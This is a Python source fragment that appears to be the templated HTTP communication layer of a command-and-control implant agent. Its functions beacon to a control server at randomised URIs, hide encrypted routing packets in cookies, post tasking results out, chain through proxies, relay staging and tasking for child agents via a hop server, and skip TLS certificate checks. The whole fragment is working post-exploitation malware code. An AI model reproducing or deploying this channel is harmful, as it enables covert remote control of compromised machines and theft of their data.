def post_message(uri, data):
    global headers
    return (urllib.request.urlopen(urllib.request.Request(uri, data, headers))).read()


def update_proxychain(proxy_list):
    setdefaultproxy()  # Clear the default chain

    for proxy in proxy_list:
        addproxy(proxytype=proxy['proxytype'], addr=proxy['addr'], port=proxy['port'])


def send_results_for_child(received_data):
    """
    Forwards the results of a tasking to the control server.
    """
    headers['Cookie'] = "session=%s" % (received_data[1:])
    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI
    response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, headers))).read()
    return response


def send_get_tasking_for_child(received_data):
    """
    Forwards the get tasking to the control server.
    """
    decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI
    response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, headers))).read()
    return response


def send_staging_for_child(received_data, hop_name):
    """
    Forwards the staging request to the control server.
    """
    postURI = server + "/login/process.php"
    headers['Hop-Name'] = hop_name
    decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
    response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, headers))).read()
    return response


def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.
    global missedCheckins
    global server
    global headers
    global taskURIs
    data = None
    if packets:
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, packets)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)

    else:
        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
        #   meta TASKING_REQUEST = 4
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
        headers['Cookie'] = "{{ session_cookie }}session=%s" % (b64routingPacket)
    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI

    try:
        if proxy_list:
            wrapmodule(urllib.request)
        data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
        return ('200', data)

    except urllib.request.HTTPError as HTTPError:
        # if the server is reached, but returns an error (like 404)
        missedCheckins = missedCheckins + 1
        # if signaled for restaging, exit.
        if HTTPError.code == 401:
            sys.exit(0)

        return (HTTPError.code, '')

    except urllib.request.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')
    return ('', '')


# update servers
server = '{{ host }}'
if server.startswith("https"):
    hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None
